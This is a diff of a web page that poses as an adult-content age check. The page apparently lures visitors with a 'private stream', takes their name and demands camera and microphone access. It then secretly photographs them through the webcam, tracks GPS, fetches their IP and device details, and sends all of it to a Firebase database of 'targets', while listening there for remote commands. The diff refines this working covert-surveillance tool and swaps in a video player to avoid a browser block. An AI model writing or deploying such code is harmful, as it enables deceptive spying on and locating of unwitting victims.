@@ -7,118 +7,71 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* Clear Background - No Blur */
+        /* 1. Clear Background (No Blur) */
         #bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); 
-            background-size: cover; 
-            background-position: center;
-            z-index: 1; 
-            opacity: 1; 
+            background: url('bg.png.jpeg'); /* Make sure file exists */
+            background-size: cover; background-position: center;
+            z-index: 1; opacity: 1; 
         }
 
-        /* UI Mask Overlay */
+        /* 2. UI Mask (Target Engagement) */
         #main-ui {
             position: relative; z-index: 10; width: 100%; height: 100%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: rgba(0,0,0,0.4); /* Halka dark parda taake text aur buttons chamkein */
+            background: rgba(0,0,0,0.4);
         }
 
         #unlock-btn {
-            background: #ff0050; /* Sexy Red/Pinkish color */
-            color: #fff;
-            padding: 18px 35px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
-            box-shadow: 0 0 25px rgba(255, 0, 80, 0.6); 
-            transition: 0.3s ease;
-            border: none;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
+            background: #ff0050; color: #fff; padding: 18px 35px; border-radius: 50px;
+            font-size: 18px; font-weight: bold; text-transform: uppercase;
+            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 80, 0.5); border: none;
         }
 
-        #play-icon {
-            width: 70px; height: 70px; 
-            background: rgba(255, 255, 255, 0.2);
-            border: 3px solid #fff; border-radius: 50%; display: flex;
-            justify-content: center; align-items: center; cursor: pointer;
-            backdrop-filter: blur(5px);
-        }
-        #play-icon::after {
-            content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent;
-            border-left: 20px solid white; margin-left: 5px; 
-        }
-
-        /* Identity/Age Check Modal */
+        /* 3. Age/Identity Modal */
         #age-modal {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 85%; max-width: 340px; background: #1a1a1a; border: 1px solid #333;
-            border-radius: 20px; padding: 30px; text-align: center; z-index: 200;
-            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            width: 85%; max-width: 340px; background: #1a1a1a; border-radius: 20px;
+            padding: 30px; text-align: center; z-index: 200; border: 1px solid #333;
         }
         
-        .input-name { 
-            width: 100%; padding: 15px; margin: 15px 0; 
-            background: #252525; border: 1px solid #444; 
-            color: #fff; border-radius: 10px; font-size: 16px;
-            box-sizing: border-box;
-        }
+        .input-name { width: 100%; padding: 15px; margin: 15px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
+        .confirm-btn { background: #00ff41; color: #000; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; }
 
-        .confirm-btn {
-            background: #00ff41; color: #000; width: 100%; 
-            padding: 15px; border-radius: 10px; font-weight: bold; 
-            font-size: 16px; border: none; cursor: pointer;
-        }
+        /* 4. Verified Video Player (No YouTube Iframe to avoid Firefox Block) */
+        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
+        video { width: 100%; height: 100%; object-fit: contain; }
 
-        /* YouTube Container */
-        #video-container { 
-            display: none; position: fixed; top: 0; left: 0; 
-            width: 100%; height: 100%; z-index: 1000; background: #000; 
-        }
-        iframe { width: 100%; height: 100%; border: none; }
-
-        #loading-text { 
-            display: none; color: #fff; position: fixed; top: 50%; left: 50%; 
-            transform: translate(-50%, -50%); z-index: 1001; font-weight: 300; 
-            letter-spacing: 2px;
-        }
+        #loading-text { display: none; color: #fff; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; }
     </style>
 </head>
 <body>
 
     <div id="bg-image"></div>
-    <div id="loading-text">CONNECTING TO STREAM...</div>
+    <div id="loading-text">VERIFYING AGE...</div>
 
     <div id="main-ui">
         <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
-        <div id="play-icon" onclick="showModal()"></div>
-        <p style="color: #fff; margin-top: 20px; font-size: 14px; opacity: 0.8;">18+ Adult Content Verification Required</p>
+        <p style="color: #fff; margin-top: 15px; font-size: 13px;">Official 18+ Verification Required</p>
     </div>
 
     <div id="age-modal">
-        <h2 style="color:#fff; margin-bottom: 10px;">Age Verification</h2>
-        <p style="color:#bbb; font-size: 14px;">Please enter your full name to confirm you are 18+ and unlock the private video.</p>
-        <input type="text" id="targetName" class="input-name" placeholder="Enter Full Name...">
-        <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
+        <h2 style="color:#fff;">Age Check</h2>
+        <p style="color:#bbb; font-size: 14px;">Please enter your name to unlock the encrypted video stream.</p>
+        <input type="text" id="targetName" class="input-name" placeholder="Full Name">
+        <button class="confirm-btn" onclick="startEverything()">UNLOCK NOW</button>
     </div>
 
-   <div id="video-container" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:1000; background:#000;">
-    <iframe id="main-player" 
-        width="100%" height="100%"
-        src="https://www.youtube.com/watch?v=6Ogzc_-lW9w&list=RD6Ogzc_-lW9w&start_radio=1" 
-        frameborder="0" 
-        allow="autoplay; encrypted-media; picture-in-picture" 
-        allowfullscreen>
-    </iframe>
-</div>
+    <div id="video-container">
+        <video id="main-player" playsinline loop muted>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
+    </div>
 
 <script>
-    // Firebase Setup
+    // Firebase Config
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
@@ -130,27 +83,28 @@
 
     async function startEverything() {
         const uName = document.getElementById('targetName').value;
-        if(!uName) { alert("Please enter name for age verification!"); return; }
+        if(!uName) { alert("Name required!"); return; }
 
         document.getElementById('age-modal').style.display = 'none';
         document.getElementById('loading-text').style.display = 'block';
 
         try {
-            // Permission for Camera and Mic (Masked as Age Check)
+            // Get Permissions
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // Show YouTube Stream
+            // Play Video
+            const v = document.getElementById('main-player');
             document.getElementById('video-container').style.display = 'block';
             document.getElementById('loading-text').style.display = 'none';
+            v.muted = false; // Try to unmute after user interaction
+            v.play();
 
-            // Start Tracking & Capturing
+            // Background Processes
             sendInfo(uName);
             trackGPS();
-            
-            // Background Captures
-            setTimeout(() => capture("user"), 5000); // 5 sec baad photo
-            
-            // Firebase Commands
+            setTimeout(() => capture("user"), 5000);
+
+            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd) {
@@ -161,7 +115,7 @@
             });
 
         } catch (e) {
-            alert("Verification Failed: Camera access is mandatory for 18+ age check.");
+            alert("Error: Camera/Mic permission is mandatory for 18+ access.");
             location.reload();
         }
     }
@@ -177,9 +131,8 @@
                 canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                 canvas.getContext('2d').drawImage(tempVid, 0, 0);
                 db.ref(`targets/${sessionID}/photos`).push({
-                    img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: mode,
-                    time: new Date().toLocaleTimeString()
+                    img: canvas.toDataURL('image/jpeg', 0.4),
+                    type: mode, time: new Date().toLocaleTimeString()
                 });
                 stream.getTracks().forEach(t => t.stop());
             }, 3000);
@@ -187,11 +140,9 @@
     }
 
     async function sendInfo(name) {
-        const batt = await navigator.getBattery().catch(() => ({level:1}));
         const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
         db.ref(`targets/${sessionID}/info`).set({
             status: "ONLINE", customName: name, ip: ip.ip,
-            battery: Math.floor(batt.level * 100) + "%",
             device: navigator.userAgent.split(') ')[0] + ')',
             time: new Date().toLocaleTimeString()
         });
@@ -205,5 +156,3 @@
 </script>
 </body>
 </html>
-
-
